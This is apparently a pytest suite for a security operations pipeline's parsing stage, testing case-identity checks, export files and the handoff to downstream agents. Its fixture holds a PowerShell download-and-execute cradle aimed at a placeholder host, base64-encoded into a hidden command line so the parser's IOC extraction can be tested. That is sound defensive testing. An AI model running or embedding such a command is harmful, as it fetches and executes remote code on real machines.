"""tests/test_parsing_canonical_source.py -- canonical audit Phase 5.

One canonical Parsing result per case/run: the run-scoped parsing_result_json
envelope, carrying explicit case identity (incident_id + case_identity), the
run id, the inline STRUCTURED normalised_alert and the inline FLAT
processed_alert derived from it. Disk files are derived exports and are never
read back over it. Case identity is three-state (match / mismatch /
not_available) and only a match is usable workflow input.

Option A only: the alert objects themselves are unchanged, so Triage's input
and cache fingerprint, TI's input, Investigation's evidence/brief and
Reporting's processed_alert.json are all byte-for-byte what they were.

Real parser + real workflow persistence on a temporary DB and output root;
no LLM, no provider calls, no subprocess. Every sqlite3.connect aimed at the
real soc_db/ directory is redirected to tmp_path and recorded, so these tests
can never touch real runtime data.
"""
from __future__ import annotations

import base64
import json
import sqlite3
from datetime import datetime, timezone
from pathlib import Path

import pytest

import agents.investigation.skills_sidecar as skills_sidecar
import agents.parsing.parser_normaliser as pn
from agents.parsing.parser_context_guard import (
    resolve_case_identity, validate_parser_identity,
)
from agents.reporting.reporting.context_builder import build_context
from agents.threat_intelligence import threat_intel as ti
from workflow import engine as wf
from workflow import state_store as wss
from workflow import validation as wv

CASE = "INC-P5-0001"
MALICIOUS_COMMAND = "IEX (New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload.ps1')"
ENCODED = base64.b64encode(MALICIOUS_COMMAND.encode("utf-16le")).decode()
COMMAND_LINE = f"powershell.exe -nop -w hidden -enc {ENCODED}"
_REAL_SOC_DB = (Path(wf.ROOT) / "soc_db").resolve()


class _FrozenDatetime(datetime):
    """Fixed parser clock, so two parses of the same input are comparable."""

    @classmethod
    def now(cls, tz=None):
        return datetime(2026, 1, 1, tzinfo=timezone.utc) if tz else datetime(2026, 1, 1)


def _db_target(database):
    text = str(database)
    if text.startswith("file:"):
        text = text[5:].split("?", 1)[0]
    try:
        return Path(text).resolve()
    except Exception:
        return None


@pytest.fixture(autouse=True)
def real_db_attempts(tmp_path, monkeypatch):
    """Redirect (and record) any connect aimed at the real soc_db/ directory."""
    attempts: list[str] = []
    real_connect = sqlite3.connect

    def guarded(database, *args, **kwargs):
        target = _db_target(database)
        if target is not None and _REAL_SOC_DB in target.parents:
            attempts.append(str(target))
            redirected = tmp_path / "redirected_soc_db" / target.name
            redirected.parent.mkdir(exist_ok=True)
            kwargs.pop("uri", None)
            return real_connect(str(redirected), *args, **kwargs)
        return real_connect(database, *args, **kwargs)

    monkeypatch.setattr(sqlite3, "connect", guarded)
    return attempts


@pytest.fixture(autouse=True)
def _isolated(tmp_path, monkeypatch, real_db_attempts):
    monkeypatch.setattr(wss, "DB_FILE", tmp_path / "workflow.db")
    monkeypatch.setattr(wf, "PIPELINE_DB_FILE", tmp_path / "pipeline.db")
    monkeypatch.setattr(wf, "_TRUSTED_OUTPUT_ROOT", tmp_path / "trusted")
    monkeypatch.setattr(wf, "REP_DIR", tmp_path / "rep")
    monkeypatch.setattr(wf, "enrich_incident_with_apiretrieval_fetch",
                        lambda incident, host=None, token=None: incident)
    monkeypatch.setattr(wf, "generate_parsing_ai_summary", lambda result: {})   # no LLM
    monkeypatch.setattr(skills_sidecar, "build_skills_context", lambda *a, **k: {"available": False})
    monkeypatch.setattr(pn, "datetime", _FrozenDatetime)
    wss.db_init()


# ── helpers ──────────────────────────────────────────────────────────────────

def _incident(case=CASE, **extra):
    """The real workflow shape: a bare NetWitness incident record."""
    incident = {
        "id": case, "title": "High Risk Alerts: NetWitness Endpoint for WIN-HOST-1",
        "riskScore": 80, "severity": "High",
        "alertMeta": {"SourceIp": ["10.0.0.5"], "DestinationIp": ["203.0.113.9"],
                      "HostName": ["WIN-HOST-1"], "UserName": ["jdoe"], "CommandLine": [COMMAND_LINE]},
    }
    incident.update(extra)
    return incident


def _json(value):
    return json.loads(json.dumps(pn.make_json_safe(value)))


def _reference(incident, tmp_path):
    """The pre-Phase-5 derivation, recomputed independently of the workflow:
    normalised_alert straight from the parser, processed_alert from it."""
    normalised = pn.build_standard_alert(incident, output_dir=str(tmp_path / "ref"))["normalised_alert"]
    return _json(normalised), _json(pn.build_agent_friendly_processed_alert(normalised))


def _parse(incident=None):
    ctx = wf.run_until_triage_approval(incident or _incident(), allow_retry=True, parsing_only=True)
    return ctx, ctx.get("run_id")


def _envelope(case=CASE):
    return json.loads(wss.get_state(case)["parsing_result_json"])


def _read(path):
    return json.loads(Path(path).read_text(encoding="utf-8"))


def _triage(case=CASE):
    return {"ticket": {"incident_id": case, "unc": "#00077A", "classification": "HIGH", "title": "Case"},
            "metakeys_payload": {"incident_id": case, "incident_title": "Case"}}


def _investigation(case=CASE):
    return {"agent": "Investigation Agent", "incident_id": case, "investigated_for": case,
            "status": "completed", "severity": "High", "confidence": "Medium"}


def _ti(case=CASE):
    return {"incident_id": case, "status": "completed", "enrichment_risk_level": "Low",
            "enrichment_risk_score": 5, "warnings": [],
            "enriched_alert": {"incident_id": case, "alert_id": case},
            "threat_intelligence": {"indicators": []}}


def _handoff(run, attempt=1):
    wf.handoff_to_reporting(_triage(), {"id": CASE}, _investigation(), threat_intel_result=_ti(),
                            incident_id=CASE, run_id=run, reporting_stage_attempt=attempt)
    return wf.reporting_attempt_dir(CASE, run, attempt)


def _foreign_copy(envelope, foreign="INC-FOREIGN"):
    tampered = json.loads(json.dumps(envelope))
    tampered["raw_record_id"] = foreign
    tampered["normalised_alert"]["alert_summary"]["alert_id"] = foreign
    return tampered


# ── 1-3: canonical envelope identity ─────────────────────────────────────────

def test_persisted_envelope_carries_current_case_and_run_identity():
    ctx, run = _parse()
    assert ctx["stages"]["parsing"] == "completed"
    envelope = _envelope()
    assert envelope["incident_id"] == CASE
    assert envelope["run_id"] == run == wss.get_state(CASE)["run_id"]
    identity = envelope["case_identity"]
    assert identity["status"] == "match"
    assert identity["basis"] == "bare_incident_record_id"
    assert identity["expected_case_id"] == identity["parsed_case_reference"] == CASE
    assert (envelope["raw_record_id"], envelope["input_shape"], envelope["normalised_alert_count"]) == (
        CASE, "generic_dictionary", 1)
    assert ctx["parsing_validation"]["checks_passed"][-1] == "case_identity_match:bare_incident_record_id"


def test_loader_is_bound_to_the_run():
    _, run = _parse()
    assert wf.load_parsing_result_for_run(CASE, run)["run_id"] == run
    assert wf.load_parsing_result_for_run(CASE, run + "-stale") is None
    _, newer = _parse()                     # a retry mints a new run
    assert wf.load_parsing_result_for_run(CASE, run) is None
    assert wf.load_parsing_result_for_run(CASE, newer)["run_id"] == newer


def test_bare_incident_identity_resolves_deterministically_with_an_explicit_basis(tmp_path):
    first = pn.run_parser_normalisation_for_dashboard(_incident(), tmp_path / "a", expected_case_id=CASE)
    second = pn.run_parser_normalisation_for_dashboard(_incident(), tmp_path / "b", expected_case_id=CASE)
    assert resolve_case_identity(first, CASE) == resolve_case_identity(second, CASE)
    assert first["case_identity"]["basis"] == "bare_incident_record_id"
    assert first["incident_id"] == CASE
    # A wrapped shape that carries an explicit incident id resolves on that instead.
    wrapped = {"incident": {"id": CASE, "title": "Wrapped"},
               "alerts": [{"id": "ALERT-1", "title": "Alert one", "severity": "High"}]}
    result = pn.run_parser_normalisation_for_dashboard(wrapped, tmp_path / "c", expected_case_id=CASE)
    assert result["status"] == "completed"
    assert (result["case_identity"]["status"], result["case_identity"]["basis"]) == ("match", "parsed_incident_id")


# ── 4-6: mismatch / not_available rejected, never Complete ───────────────────

def test_identity_mismatch_is_rejected_by_producer_gate_and_loader(tmp_path):
    produced = pn.run_parser_normalisation_for_dashboard(_incident(), tmp_path / "p", expected_case_id="INC-OTHER")
    assert produced["status"] == "failed"
    assert produced["case_identity"]["status"] == "mismatch"
    assert "case_id" in produced["identity_validation"]["hard_failures"]
    assert "incident_id" not in produced            # no envelope identity on a failed check

    good = pn.run_parser_normalisation_for_dashboard(_incident(), tmp_path / "g", expected_case_id=CASE)
    with pytest.raises(wv.ParsingValidationError, match="belongs to case 'INC-P5-0001', expected 'INC-OTHER'"):
        wv.validate_parsing_result(incident_id="INC-OTHER", parsing_result=good)

    _, run = _parse()
    wss.save_parsing_result(CASE, run, _foreign_copy(_envelope()))
    assert wf.load_parsing_result_for_run(CASE, run) is None


def test_not_available_identity_is_rejected_by_producer_gate_and_loader(tmp_path):
    no_id = _incident()
    no_id.pop("id")
    produced = pn.run_parser_normalisation_for_dashboard(no_id, tmp_path / "p", expected_case_id=CASE)
    assert produced["status"] == "failed"
    assert produced["case_identity"]["status"] == "not_available"
    assert "could not be verified" in produced["summary"]

    # A pre-Phase-5 envelope: inline alerts but no identity evidence at all
    # (the shape of every parsing_result_json persisted before this phase).
    _, run = _parse()
    legacy = {k: v for k, v in _envelope().items()
              if k not in ("incident_id", "case_identity", "raw_record_id", "input_shape", "normalised_alert_count")}
    assert resolve_case_identity(legacy, CASE)["status"] == "not_available"
    with pytest.raises(wv.ParsingValidationError, match="no verifiable case identity"):
        wv.validate_parsing_result(incident_id=CASE, parsing_result={"status": "completed", **legacy})
    wss.save_parsing_result(CASE, run, legacy)
    assert wf.load_parsing_result_for_run(CASE, run) is None


def test_parsing_is_never_marked_complete_with_unverifiable_identity(monkeypatch):
    unverifiable = {"status": "completed", "parser_confidence": "High", "summary": "Parsed.",
                    "normalised_alert": {"alert_summary": {"alert_id": "SOMETHING"}},
                    "processed_alert": {"host": "WIN-TEST-01"}, "output_files": {}}
    monkeypatch.setattr(wf, "run_parsing", lambda incident, run_id: unverifiable)
    ctx, run = _parse()
    state = wss.get_state(CASE)
    assert ctx["stages"]["parsing"] == "failed"
    assert state["parsing_status"] == "Failed"
    assert state["parsing_result_json"] is None          # validated before persist / Complete
    assert "no verifiable case identity" in state["last_error"]
    assert wf.load_parsing_result_for_run(CASE, run) is None


def test_validator_reports_explicit_three_state_outcomes():
    parsed = {"normalised_alert": {"alert_summary": {"alert_id": "A-1"}}, "selected_alert_id": "A-1"}
    plain = validate_parser_identity({"alert_id": "A-1", "incident_id": None}, parsed)
    outcomes = {c["field"]: c["outcome"] for c in plain["checks"]}
    assert outcomes["alert_id"] == "match" and outcomes["incident_id"] == "not_available"
    assert plain["passed"] is True                      # unchanged without an expected case
    strict = validate_parser_identity({"alert_id": "A-1", "incident_id": None}, parsed, expected_case_id=CASE)
    case_check = next(c for c in strict["checks"] if c["field"] == "case_id")
    assert (case_check["outcome"], case_check["matched"]) == ("not_available", None)
    assert strict["passed"] is False and strict["hard_failures"] == ["case_id"]


# ── 7-13: structured vs flat, files, output_files, soc_context ──────────────

def test_normalised_alert_stays_structured_after_reload(tmp_path):
    _, run = _parse()
    loaded = wf.load_parsing_result_for_run(CASE, run)
    reference_normalised, _ = _reference(_incident(), tmp_path)
    assert loaded["normalised_alert"] == _envelope()["normalised_alert"] == reference_normalised
    assert {"alert_summary", "network_indicators", "powershell_analysis"} <= set(loaded["normalised_alert"])
    assert loaded["normalised_alert"].get("current_stage") != "parsing_normalisation_completed"
    assert loaded["case_identity"]["status"] == "match"


def test_processed_alert_stays_flat_and_derived(tmp_path):
    _, run = _parse()
    loaded = wf.load_parsing_result_for_run(CASE, run)
    _, reference_processed = _reference(_incident(), tmp_path)
    processed = loaded["processed_alert"]
    assert processed == reference_processed
    assert processed["current_stage"] == "parsing_normalisation_completed"
    assert processed["source_ip"] == "10.0.0.5"            # flat scalar view
    assert processed["normalised_alert"] == loaded["normalised_alert"]


def test_export_files_hold_their_own_shapes_and_do_not_overwrite_each_other():
    _parse()
    envelope = _envelope()
    files = envelope["output_files"]
    parsed_incident = _read(files["parsed_incident"])
    processed = _read(files["processed_alert"])
    assert parsed_incident == [envelope["normalised_alert"]]      # structured records (list)
    assert processed == envelope["processed_alert"]                # flat view
    assert parsed_incident != processed


def test_output_files_reference_real_files_with_the_advertised_semantics():
    _parse()
    files = _envelope()["output_files"]
    assert "normalised_alert" not in files                         # no file-backed selected record
    assert set(files) == {"parsed_incident", "all_normalised_alerts", "processed_alert",
                          "parsed_incident_file", "processed_alert_flat"}
    assert all(Path(path).is_file() for path in files.values())
    assert files["parsed_incident"] == files["all_normalised_alerts"] == files["parsed_incident_file"]
    assert files["processed_alert"] == files["processed_alert_flat"]
    assert Path(files["parsed_incident"]).name == "parsed_incident.json"
    assert Path(files["processed_alert"]).name == "processed_alert.json"


def test_inline_result_is_not_replaced_by_stale_or_foreign_disk_files():
    _, run = _parse()
    envelope = _envelope()
    foreign = {"incident_id": "INC-FOREIGN", "alert_id": "INC-FOREIGN", "source_ip": "198.51.100.66"}
    for key in ("parsed_incident", "processed_alert"):
        Path(envelope["output_files"][key]).write_text(json.dumps(foreign), encoding="utf-8")
    loaded = wf.load_parsing_result_for_run(CASE, run)
    assert loaded["normalised_alert"] == envelope["normalised_alert"]
    assert loaded["processed_alert"] == envelope["processed_alert"]
    handed = _read(_handoff(run) / "inputs" / "processed_alert.json")
    assert handed == envelope["processed_alert"] and "INC-FOREIGN" not in json.dumps(handed)


def test_absent_export_files_are_optional_and_a_missing_result_is_explicit():
    _, run = _parse()
    envelope = _envelope()
    for key in ("parsed_incident", "processed_alert"):
        Path(envelope["output_files"][key]).unlink()
    loaded = wf.load_parsing_result_for_run(CASE, run)
    assert loaded["processed_alert"] == envelope["processed_alert"]   # derived exports are optional
    # No Parsing result at all for the run: loader says so (None) and the
    # Reporting handoff writes no processed_alert.json rather than a guess.
    wss._guarded_update(CASE, run, {"parsing_result_json": None})
    assert wf.load_parsing_result_for_run(CASE, run) is None
    assert not (_handoff(run) / "inputs" / "processed_alert.json").exists()


def test_dead_soc_context_metadata_is_gone(tmp_path):
    result = pn.build_standard_alert(_incident(), output_dir=str(tmp_path))
    for files in (result["output_files"], result["parser_summary"]["output_files"]):
        assert files == pn.parsing_output_files(tmp_path)
        assert not any(Path(path).name.startswith("soc_context_") for path in files.values())
    for retired in ("NORMALISED_ALERT_FILE", "PROCESSED_ALERT_CSV_FILE", "ALL_NORMALISED_ALERTS_FILE",
                    "ALL_PARSED_EVENTS_FILE", "PARSER_SUMMARY_FILE", "RAW_DEBUG_FILE"):
        assert not hasattr(pn, retired)
    _parse()
    parsing_dir = Path(_envelope()["output_files"]["parsed_incident"]).parent
    assert sorted(p.name for p in parsing_dir.iterdir()) == ["parsed_incident.json", "processed_alert.json"]


def test_cli_write_outputs_still_writes_a_usable_flat_processed_alert(tmp_path):
    result = pn.build_standard_alert(_incident(), output_dir=str(tmp_path))
    paths = pn.write_outputs(result, output_dir=str(tmp_path))
    assert _read(paths["processed_alert"]) == _json(
        pn.build_agent_friendly_processed_alert(result["normalised_alert"]))
    assert _read(paths["parsed_incident"])[0]["alert_summary"]["alert_id"] == CASE


# ── 14-17: Triage / TI / Investigation inputs unchanged ─────────────────────

def test_triage_receives_the_unchanged_processed_alert_and_cache_fingerprint(monkeypatch, tmp_path):
    from agents.triage import soc_triage_agent as triage_agent

    _, run = _parse()
    captured = {}

    def capture(incident, progress_fn=None, parsed_context=None, force=False):
        captured.update(incident=incident, parsed_context=parsed_context)
        return {"error": "captured by the Phase 5 test"}

    monkeypatch.setattr(wf, "run_triage", capture)
    wss.set_triage_status(CASE, run, "Processing")
    wf.run_triage_stage(CASE, run)

    _, reference_processed = _reference(_incident(), tmp_path)
    assert captured["parsed_context"] == reference_processed
    # Option B was NOT applied: no identity stamped into Triage's input.
    assert "incident_id" not in captured["parsed_context"]
    assert "incident_id" not in captured["parsed_context"]["normalised_alert"]["alert_summary"]
    assert (triage_agent._incident_fingerprint(captured["incident"], captured["parsed_context"])
            == triage_agent._incident_fingerprint(captured["incident"], reference_processed))


def test_threat_intel_receives_the_unchanged_processed_alert(monkeypatch, tmp_path):
    _, run = _parse()
    captured = {}

    def capture(incident_id, run_id, normalised_alert, triage_result, incident=None):
        captured.update(normalised_alert=normalised_alert, incident=incident)
        raise RuntimeError("captured by the Phase 5 test")

    monkeypatch.setattr(wf, "run_threat_intel", capture)
    wss._guarded_update(CASE, run, {"threat_intel_status": "Processing"})
    wf.resume_after_triage_approval(CASE, run)

    _, reference_processed = _reference(_incident(), tmp_path)
    assert captured["normalised_alert"] == reference_processed
    flatten = lambda alert: ti.flatten_alert_for_enrichment(ti._build_flat_alert(captured["incident"], {}, alert))
    flat = flatten(captured["normalised_alert"])
    assert flat == flatten(reference_processed)
    assert "http://malicious.example.com/payload.ps1" in json.dumps(flat)     # Parsing's PowerShell IOC


def test_investigation_receives_the_same_evidence_and_context_brief():
    _, run = _parse()
    loaded = wf.load_parsing_result_for_run(CASE, run)
    # What the pre-Phase-5 loader handed Investigation: normalised_alert
    # replaced by the flat processed_alert read back from parsed_incident.json.
    pre_phase5 = dict(loaded, normalised_alert=loaded["processed_alert"])
    incident = wf.load_raw_incident_for_run(CASE, run)
    now = wf.build_investigation_alert(_triage(), incident, parsing_result=loaded)
    before = wf.build_investigation_alert(_triage(), incident, parsing_result=pre_phase5)
    assert now == before
    brief = now["investigation_context_brief"]
    assert "10.0.0.5" in brief and "203.0.113.9" in brief                       # entities
    assert "Decoded PowerShell [Parsing]: status success" in brief              # decoded PowerShell
    assert "http://malicious.example.com/payload.ps1" in brief                 # Parsing-extracted IOC
    assert "Parser confidence: Low" in brief                                    # confidence
    assert "Parsing warnings:" in brief and "Parsing missing fields" in brief   # warnings / missing
    assert ENCODED in json.dumps(now)                                           # command line


def test_parsing_evidence_is_preserved_in_the_canonical_result():
    _, run = _parse()
    loaded = wf.load_parsing_result_for_run(CASE, run)
    normalised, processed = loaded["normalised_alert"], loaded["processed_alert"]
    assert normalised["process_indicators"]["command_lines"] == [COMMAND_LINE]
    assert processed["command_line"] == COMMAND_LINE
    assert normalised["powershell_analysis"]["decoded_commands"] == [MALICIOUS_COMMAND]
    assert processed["decoded_powershell_command"] == MALICIOUS_COMMAND
    assert processed["powershell_extracted_iocs"]["urls"] == ["http://malicious.example.com/payload.ps1"]
    assert loaded["warnings"] == ["Missing context-relevant parsing fields: "
                                  "alert_time, destination_port, protocol, process_name"]
    assert loaded["missing_important_fields"] == ["alert_time", "destination_port", "protocol", "process_name"]
    assert loaded["parser_confidence"] == "Low"


# ── 18, 28, 29: Reporting ────────────────────────────────────────────────────

def test_reporting_gets_the_identity_verified_unchanged_processed_alert():
    _, run = _parse()
    envelope = _envelope()
    attempt_dir = _handoff(run)
    handed = _read(attempt_dir / "inputs" / "processed_alert.json")
    assert handed == envelope["processed_alert"] == _read(envelope["output_files"]["processed_alert"])
    manifest = _read(attempt_dir / "inputs" / "handoff_manifest.json")
    assert str(Path("inputs") / "processed_alert.json") in manifest["files"]


def test_reporting_refuses_a_parsing_result_that_is_not_identity_verified():
    _, run = _parse()
    envelope = _envelope()
    wss.save_parsing_result(CASE, run, _foreign_copy(envelope))
    # A plausible processed_alert.json sits on disk, as the old handoff trusted.
    Path(envelope["output_files"]["processed_alert"]).write_text(
        json.dumps({"incident_id": CASE, "alert_id": CASE}), encoding="utf-8")
    assert not (_handoff(run) / "inputs" / "processed_alert.json").exists()


def test_phase3_and_phase4_reporting_mappings_are_intact():
    _, run = _parse()
    attempt_dir = _handoff(run)
    read = lambda rel: _read(attempt_dir / rel)
    context = build_context({
        "processed_alert": read("inputs/processed_alert.json"),
        "enriched_alert": read("inputs/enriched_alert.json"),
        "triage_result": read("outputs/triage_result.json"),
        "investigation_result": read("outputs/investigation_result.json"),
        "threat_intel_result": read("inputs/threat_intel_result.json"),
        "approval_history": read("inputs/approval_history.json"),
        "workflow_metadata": read("inputs/workflow_metadata.json"),
    })
    assert context["incident_id"] == CASE
    netwitness = context["severity_sources"]["netwitness_severity"]
    assert netwitness == {"value": "High", "source": "NetWitness alert (as normalised by Parsing)"}
    assert context["approval_context"]["reporting"]["status"] == "Pending"
    assert context["approval_context"]["run_id"] == run


# ── 26: multi-alert characterisation (no behaviour change) ──────────────────

def _multi_alert_incident():
    def alert(i):
        return {"_id": f"mongo-{i}", "incidentId": CASE, "title": f"Alert {i}",
                "originalAlert": {"events": [{"ip_src": f"10.1.1.{i}", "ip_dst": f"203.0.113.{i}",
                                              "alias_host": f"HOST-{i}"}]}}
    return {"id": CASE, "title": "Multi-alert case", "riskScore": 70, "alerts": [alert(1), alert(2), alert(3)]}


def test_attached_alerts_are_parsed_as_one_aggregate_record(tmp_path):
    result = pn.build_standard_alert(_multi_alert_incident(), output_dir=str(tmp_path))
    normalised = result["normalised_alert"]
    assert (result["input_shape"], result["normalised_alert_count"], result["event_count"]) == (
        "generic_dictionary", 1, 3)
    assert normalised["network_indicators"]["source_ips"] == ["10.1.1.1", "10.1.1.2", "10.1.1.3"]
    assert normalised["network_indicators"]["destination_ips"] == ["203.0.113.1", "203.0.113.2", "203.0.113.3"]
    assert normalised["user_and_host_indicators"]["hostnames"] == ["HOST-1", "HOST-2", "HOST-3"]
    # The record's own id is the incident id; alert_summary.incident_id stays absent.
    assert normalised["alert_summary"]["alert_id"] == CASE
    assert "incident_id" not in normalised["alert_summary"]


def test_attached_alert_workflow_parse_still_fails_its_existing_alert_id_check():
    """Characterisation only: the input fingerprint takes the FIRST attached
    alert's _id while the aggregate record's alert_id is the incident id, so
    parser_context_guard's pre-existing hard alert_id check fails. Case
    identity itself resolves to a match. Unchanged in Phase 5."""
    ctx, _ = _parse(_multi_alert_incident())
    assert ctx["stages"]["parsing"] == "failed"
    validation = ctx["parsing"]["identity_validation"]
    assert validation["hard_failures"] == ["alert_id"]
    assert ctx["parsing"]["case_identity"]["status"] == "match"
    assert wss.get_state(CASE)["parsing_result_json"] is None


# ── 30: no real database is ever opened ─────────────────────────────────────

def test_phase5_paths_never_open_the_real_soc_db(real_db_attempts):
    _, run = _parse()
    wf.load_parsing_result_for_run(CASE, run)
    wv.validate_parsing_result(incident_id=CASE, parsing_result=_envelope())
    _handoff(run)
    assert real_db_attempts == []
    assert Path(wss.DB_FILE).parent != _REAL_SOC_DB
